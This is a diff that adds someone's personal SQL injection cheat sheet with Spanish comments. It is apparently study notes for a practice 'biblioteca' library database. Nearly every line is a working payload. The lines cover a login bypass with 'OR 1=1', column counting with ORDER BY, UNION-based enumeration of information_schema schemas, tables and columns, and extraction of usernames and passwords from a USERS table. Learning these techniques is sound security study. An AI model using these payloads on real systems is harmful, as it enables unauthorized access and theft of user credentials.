@@ -1,1 +1,16 @@
-test
+SELECT username, password FROM users_db WHERE username='username' AND password='' OR 1=1-- -'
+
+
+SELECT id, nombre, autor FROM libros WHERE autor='1' ORDER BY 3-- -
+
+SELECT id, nombre, autor FROM libros WHERE autor='1' UNION SELECT 1,2,3-- -
+1' UNION SELECT column_name, table_name, table_schema FROM information_schema.COLUMNS-- - Para todas las base de datos sus tablas y sus columnas
+1' UNION SELECT schema_name, null, null FROM information_schema.SCHEMATA-- - Para todas las base de datos
+
+1' UNION SELECT table_name, null, null FROM information_schema.COLUMNS WHERE table_schema LIKE 'biblioteca'-- -
+
+1' UNION SELECT column_name, null, null FROM information_schema.COLUMNS WHERE table_schema LIKE 'biblioteca' AND table_name LIKE 'USERS'-- -
+
+1' UNION SELECT id, username, password FROM USERS-- - Primera forma
+
+1' UNION SELECT CONCAT(id, ' ', username, ' ', password),null,null FROM USERS-- - Segunda
